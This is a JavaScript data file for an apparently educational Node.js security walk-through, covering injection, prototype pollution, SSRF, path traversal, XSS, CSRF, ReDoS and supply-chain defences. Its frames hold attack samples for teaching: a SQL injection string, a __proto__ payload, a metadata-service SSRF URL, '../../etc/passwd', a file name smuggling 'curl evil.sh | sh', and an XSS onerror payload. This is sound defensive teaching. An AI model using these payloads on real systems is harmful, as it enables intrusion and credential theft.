// Frame data for the "Node.js security" walk-through, drawn by BoardStage.

import { BoardStage } from './BoardStage.jsx';

const box = (id, x, y, w, title, lines, tone = 'none', o = {}) => ({ id, x, y, w, title, lines, mono: true, tone, ...o });
const C1 = 14, C2 = 230, C3 = 446, W = 180;
const W2 = 290, R2 = 336;

/* ---------- never trust input ---------- */
const inputFrames = [
  {
    h: 250,
    line: 'parseTransfer(req.body)',
    result: { text: 'clean, typed, new object', tone: 'ok' },
    regions: [{ x: 6, y: 30, w: 200, h: 200, title: 'untrusted', tone: 'bad' }, { x: 426, y: 30, w: 200, h: 200, title: 'trusted', tone: 'ok' }],
    cards: [
      box('u', 18, 62, 176, 'req.body', ['amount: "500"', 'role: "admin"', 'from: { $ne: null }'], 'bad'),
      box('v', C2, 90, W, 'strict schema', ['types, ranges', 'unknown keys → 422'], 'new', { badge: 'at the edge' }),
      box('t', 438, 62, 176, 'transfer', ['from: "ACC12345"', 'amount: 50000', 'currency: "SGD"'], 'ok'),
    ],
    arrows: [{ from: 'u', to: 'v', fs: 'r', ts: 'l', tone: 'warn' }, { from: 'v', to: 't', fs: 'r', ts: 'l', tone: 'ok' }],
    note: 'Body, query, headers, cookies and files all cross a trust boundary. Validate them once, at the edge, against a strict schema. Build a new object from the result. The rest of the code then works with clean data.',
  },
  {
    h: 250,
    line: "?owner=' OR '1'='1",
    result: { text: 'parameters: data never becomes code', tone: 'ok' },
    cards: [
      box('s', C1, 50, W2, 'string-built SQL', ["WHERE owner = '' OR '1'='1'", 'returns every account'], 'bad'),
      box('p', R2, 50, W2, 'parameterised', ['WHERE owner = $1', "$1 = \"' OR '1'='1\""], 'ok'),
      box('a', C1, 170, 612, 'cannot be a parameter? allow-list it', ["{ date: 'created_at', amount: 'amount' }[req.query.sort]"], 'new'),
    ],
    note: 'Gluing a value into SQL lets a quote change the query. Parameters send the SQL and the values separately, so a value can never become code. Allow-list anything that cannot be a parameter, such as a sort column.',
  },
  {
    h: 250,
    line: 'db.update(id, { ...req.body })',
    result: { text: 'pick the allowed fields', tone: 'ok' },
    cards: [
      box('b', C1, 60, W, 'request body', ['nickname: "x"', 'role: "admin"'], 'bad'),
      box('u', C2, 60, W, 'spread into update', ['every key copied'], 'bad'),
      box('r', C3, 60, W, 'account row', ['role = "admin"'], 'bad', { badge: 'escalated' }),
      box('f', C1, 170, 612, '{ nickname } = parse(body)', ['unknown keys rejected; role, owner and balance are never taken from the client'], 'ok'),
    ],
    arrows: [{ from: 'b', to: 'u', fs: 'r', ts: 'l', tone: 'bad' }, { from: 'u', to: 'r', fs: 'r', ts: 'l', tone: 'bad' }],
    note: 'Mass assignment: spreading the body into an update lets a caller set fields they must never touch. Reject unknown keys, and build the update from the fields you allow.',
  },
  {
    h: 250,
    line: 'merge({}, {"__proto__": {"isAdmin": true}})',
    result: { text: 'every object is now admin', tone: 'bad' },
    cards: [
      box('m', C1, 50, W, 'unsafe deep merge', ['follows __proto__'], 'bad'),
      box('p', C2, 50, W, 'Object.prototype', ['isAdmin: true'], 'bad', { badge: 'shared' }),
      box('o', C3, 50, W, '({}).isAdmin', ['true, everywhere'], 'bad'),
      box('s', C1, 170, 612, 'safe merge: skip __proto__, constructor, prototype', ['Object.hasOwn, Map or Object.create(null) for user keys'], 'ok'),
    ],
    arrows: [{ from: 'm', to: 'p', fs: 'r', ts: 'l', tone: 'bad' }, { from: 'p', to: 'o', fs: 'r', ts: 'l', tone: 'bad' }],
    note: 'Prototype pollution: a merge that follows the key __proto__ writes onto the prototype every object shares. JSON.parse is safe; the merge after it is not. Skip the dangerous keys.',
  },
];

/* ---------- server-side requests and files ---------- */
const serverFrames = [
  {
    h: 270,
    line: 'fetch(req.body.callbackUrl)',
    result: { text: 'SSRF: credentials leaked', tone: 'bad' },
    regions: [{ x: 326, y: 30, w: 300, h: 224, title: 'your private network', tone: 'bad' }],
    cards: [
      box('a', C1, 70, 270, 'attacker', ['callbackUrl =', 'http://169.254.169.254/…'], 'bad'),
      box('s', 338, 70, 276, 'your service', ['fetches whatever it is given'], 'warn'),
      box('m', 338, 180, 276, 'cloud metadata service', ['role credentials'], 'bad', { badge: 'reachable' }),
    ],
    arrows: [{ from: 'a', to: 's', fs: 'r', ts: 'l', tone: 'bad' }, { from: 's', to: 'm', fs: 'b', ts: 't', tone: 'bad' }],
    note: 'Server-side request forgery: your server fetches a URL the attacker chose. From inside the network it can reach the cloud metadata service, which hands out credentials.',
  },
  {
    h: 250,
    line: 'await assertPublicHttpUrl(url)',
    result: { text: 'private addresses refused', tone: 'ok' },
    steps: { items: ['https only', 'allow-listed host', 'resolve DNS', 'no private IPs', 'no redirects', 'timeout'], at: 5 },
    cards: [
      box('x1', C1, 50, W, '169.254.169.254', ['link-local'], 'bad', { badge: 'refused' }),
      box('x2', C2, 50, W, '::ffff:127.0.0.1', ['mapped loopback'], 'bad', { badge: 'refused' }),
      box('ok', C3, 50, W, 'api.partner.example', ['public address'], 'ok', { badge: 'allowed' }),
    ],
    note: 'Allow-list hosts. Resolve the name, and refuse loopback, private and link-local addresses. Do not follow redirects. Add egress rules too, because DNS can change between the check and the call.',
  },
  {
    h: 250,
    line: 'GET /files?name=../../etc/passwd',
    result: { text: 'resolve, then check it stays inside', tone: 'ok' },
    cards: [
      box('i', C1, 50, W, 'user path', ['../../etc/passwd'], 'bad'),
      box('r', C2, 50, W, 'path.resolve(base, p)', ['/etc/passwd'], 'warn'),
      box('c', C3, 50, W, 'path.relative(base, t)', ['"../../etc/passwd"', 'starts with .. → 400'], 'ok'),
      box('g', C1, 170, 612, 'better: no user text in paths at all', ['store under a generated id, look the name up in the database'], 'new'),
    ],
    arrows: [{ from: 'i', to: 'r', fs: 'r', ts: 'l', tone: 'warn' }, { from: 'r', to: 'c', fs: 'r', ts: 'l', tone: 'ok' }],
    note: 'Path traversal: ../ climbs out of the folder you meant to serve. Resolve the full path first, then check it is still inside the base folder. Better still, never build paths from user text.',
  },
  {
    h: 250,
    line: 'file = "a.png && curl evil.sh | sh"',
    result: { text: 'no shell: text stays one argument', tone: 'ok' },
    cards: [
      box('e', C1, 50, W2, 'exec(`convert ${file} out.png`)', ['a shell parses the string', 'runs the second command'], 'bad'),
      box('f', R2, 50, W2, "execFile('convert', [file, 'out.png'])", ['no shell involved', 'file is one argument'], 'ok'),
      box('n', C1, 170, 612, 'never: eval, new Function, vm as a sandbox', ['prefer a library to spawning programs'], 'warn'),
    ],
    note: 'Command injection: exec hands one string to a shell, so && or ; run extra commands. execFile with an argument array starts the program directly. Prefer a library when one can do the job.',
  },
];

/* ---------- protect the browser ---------- */
const browserFrames = [
  {
    h: 250,
    line: 'el.innerHTML = note',
    result: { text: 'encode output, sanitise rich text', tone: 'ok' },
    cards: [
      box('n', C1, 50, W, 'stored note', ['<img src=x', 'onerror=steal()>'], 'bad'),
      box('p', C2, 50, W, "victim's page", ['script runs as', 'the victim'], 'bad'),
      box('f', C3, 50, W, 'React {note}', ['escaped: shown as text'], 'ok'),
      box('s', C1, 170, 612, 'rich text you must allow: DOMPurify on a strict allow-list', ['plus a Content Security Policy to limit any script that slips through'], 'new'),
    ],
    arrows: [{ from: 'n', to: 'p', fs: 'r', ts: 'l', tone: 'bad' }],
    note: 'Cross-site scripting: user text put into a page without encoding runs as script in the victim\'s browser. Encode output for its context, and sanitise any rich text with a maintained library.',
  },
  {
    h: 250,
    line: 'helmet() + cors({ origin: allowList })',
    result: { text: 'headers limit the damage', tone: 'ok' },
    cards: [
      box('c', C1, 50, W, 'CSP', ["script-src 'self'", "frame-ancestors 'none'"], 'new'),
      box('h', C2, 50, W, 'helmet', ['HSTS, nosniff', 'referrer policy'], 'ok'),
      box('o', C3, 50, W, 'CORS', ['exact origin allow-list', 'never * with cookies'], 'ok'),
      box('x', C1, 170, 612, "origin.endsWith('bank.example')", ['also matches evilbank.example: compare exact origins'], 'bad'),
    ],
    note: 'helmet sets a Content Security Policy, HSTS and other headers. CORS controls which origins may read your responses; it is not authentication. Compare origins exactly.',
  },
  {
    h: 250,
    line: '<form action="https://bank.example/transfers">',
    result: { text: 'cross-site request blocked', tone: 'ok' },
    cards: [
      box('e', C1, 60, W, 'evil.example', ['auto-submits a form'], 'bad'),
      box('b', C2, 60, W, 'browser', ['would attach the', 'session cookie'], 'warn'),
      box('a', C3, 60, W, 'your API', ['SameSite=Lax', 'CSRF token missing'], 'ok', { badge: '403' }),
    ],
    arrows: [{ from: 'e', to: 'b', fs: 'r', ts: 'l', tone: 'bad' }, { from: 'b', to: 'a', fs: 'r', ts: 'l', tone: 'warn', cross: true }],
    note: 'With cookie sessions, the browser sends the cookie even on a request another site triggers. SameSite cookies, an anti-CSRF token or custom header, and an Origin check stop it. Never change state on GET.',
  },
];

/* ---------- defence in depth ---------- */
const defenceFrames = [
  {
    h: 250,
    line: '/^(a+)+$/.test("a".repeat(28) + "b")',
    result: { text: '~3 s: the loop serves nobody', tone: 'bad' },
    texts: [{ x: 14, y: 60, t: 'nested quantifier, time by input length' }, { x: 14, y: 100, t: 'n = 20' }, { x: 14, y: 150, t: 'n = 26' }, { x: 14, y: 200, t: 'n = 28' }],
    cards: [
      { id: 'a', x: 120, y: 80, w: 14, h: 30, title: '', tone: 'warn' },
      { id: 'al', x: 140, y: 80, w: 80, h: 30, title: '54 ms', tone: 'none' },
      { id: 'b', x: 120, y: 130, w: 120, h: 30, title: '601 ms', tone: 'warn' },
      { id: 'c', x: 120, y: 180, w: 506, h: 30, title: '≈ 3,000 ms', tone: 'bad', badge: 'ReDoS' },
    ],
    note: 'Abuse is part of the threat. A regex with nested quantifiers backtracks exponentially. Limit body size, request time and rate. Use linear patterns, and cap input length before matching.',
  },
  {
    h: 250,
    line: 'encrypt(pan, key, accountId)   // AES-256-GCM',
    result: { text: 'tampering is detected', tone: 'ok' },
    cards: [
      box('iv', C1, 60, 120, 'iv', ['12 random bytes'], 'new'),
      box('tg', 146, 60, 120, 'tag', ['16 bytes'], 'ok'),
      box('ct', 278, 60, 348, 'ciphertext', ['bound to accountId as AAD'], 'ok'),
      box('k', C1, 170, 612, 'also', ['keys from a KMS, never in code', 'randomBytes, never Math.random; timingSafeEqual, never ==='], 'warn'),
    ],
    note: 'Use an authenticated cipher, AES-256-GCM, with a fresh IV for every message. The tag makes any change fail on decryption. Keep keys in a KMS, and redact secrets from logs.',
  },
  {
    h: 250,
    line: 'pnpm install --frozen-lockfile',
    result: { text: 'only reviewed versions run', tone: 'ok' },
    cards: [
      box('t', C1, 60, W, 'expresss', ['typosquat with a', 'postinstall script'], 'bad'),
      box('l', C2, 60, W, 'lockfile + audit', ['scripts blocked unless', 'allow-listed'], 'ok'),
      box('r', C3, 60, W, 'Renovate PRs', ['reviewed and tested', 'updates'], 'ok'),
    ],
    arrows: [{ from: 't', to: 'l', fs: 'r', ts: 'l', tone: 'bad', cross: true }],
    note: 'Most of your code is other people\'s code. Commit the lockfile, install it frozen, audit, block install scripts, and take updates through reviewed pull requests.',
  },
  {
    h: 230,
    line: 'audit("transfer", { who, what, when, outcome })',
    result: { text: 'detect, then respond', tone: 'warn' },
    cards: [
      box('a', C1, 70, W, 'audit log', ['append-only', 'no secrets'], 'new'),
      box('s', C2, 70, W, 'alerts', ['spikes in 401, 403'], 'warn'),
      box('i', C3, 70, W, 'incident response', ['contain, rotate,', 'investigate, learn'], 'ok'),
    ],
    arrows: [{ from: 'a', to: 's', fs: 'r', ts: 'l', tone: 'warn' }, { from: 's', to: 'i', fs: 'r', ts: 'l', tone: 'ok' }],
    note: 'You cannot prevent everything, so detect it. Log sign-ins, authorisation failures and every money movement. Alert on unusual patterns, and rehearse the incident response.',
  },
];

export const NODE_SECURITY_SCENES = [
  { id: 'input', label: 'Never trust input', title: 'Everything from outside is hostile until checked', stage: BoardStage, frames: inputFrames },
  { id: 'server', label: 'Server-side requests and files', title: 'When your server fetches, reads or runs things', stage: BoardStage, frames: serverFrames },
  { id: 'browser', label: 'Protect the browser', title: 'Keep scripts and cross-site requests out', stage: BoardStage, frames: browserFrames },
  { id: 'defence', label: 'Defence in depth', title: 'Limit abuse, protect data, watch the supply chain', stage: BoardStage, frames: defenceFrames },
];
